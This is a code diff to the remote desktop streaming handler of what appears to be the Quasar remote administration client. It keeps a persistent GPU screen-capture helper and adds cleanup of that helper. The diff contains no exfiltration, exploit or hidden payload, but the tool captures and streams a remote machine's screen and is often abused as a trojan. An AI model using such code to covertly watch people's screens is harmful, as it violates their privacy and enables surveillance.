@@ -27,6 +27,8 @@ namespace Quasar.Client.Messages
         private Thread _sendFramesThread;
         private CancellationTokenSource _cancellationTokenSource;
 
+        private ScreenHelperGPU _screenHelper;
+
         private bool _useGpu = false;
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
@@ -135,6 +137,12 @@ namespace Quasar.Client.Messages
                 _desktop = null;
             }
 
+            if (_screenHelper != null)
+            {
+                _screenHelper.Dispose();
+                _screenHelper = null;
+            }
+
             if (_streamCodec != null)
             {
                 _streamCodec.Dispose();
@@ -157,13 +165,17 @@ namespace Quasar.Client.Messages
             {
                 if (_useGpu)
                 {
-                    _desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
+                    if (_screenHelper == null)
+                    {
+                        _screenHelper = new ScreenHelperGPU(_displayIndex);
+                    }
+
+                    _desktop = _screenHelper.CaptureScreen();
                 }
                 else
                 {
                     _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
                 }
-                //_desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
 
                 if (_desktop == null)
                 {
@@ -282,6 +294,10 @@ namespace Quasar.Client.Messages
         {
             Dispose(true);
             GC.SuppressFinalize(this);
+            StopScreenStreaming();
+            _streamCodec?.Dispose();
+            _cancellationTokenSource?.Dispose();
+            _screenHelper?.Dispose();
         }
 
         protected virtual void Dispose(bool disposing)
@@ -291,6 +307,7 @@ namespace Quasar.Client.Messages
                 StopScreenStreaming();
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
+                _screenHelper?.Dispose();
             }
         }
     }
